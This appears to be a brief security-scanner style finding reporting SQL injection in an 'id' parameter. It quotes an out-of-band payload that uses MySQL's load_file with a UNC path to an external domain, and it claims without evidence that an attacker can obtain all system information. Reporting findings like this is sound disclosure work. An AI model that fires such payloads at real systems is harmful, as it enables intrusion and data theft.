# Description:
The id parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\95ctkydmc3d4ykhxxtph7p6xgomiagy71vsij68.tupgus.com\\mpk'))+'
was submitted in the id parameter. This payload injects a SQL
sub-query that calls MySQL's load_file function with a UNC file path
that references a URL on an external domain. The application
interacted with that domain, indicating that the injected SQL query
was executed. The attacker can get all information from the system by
using this vulnerability!

STATUS: HIGH- Vulnerability
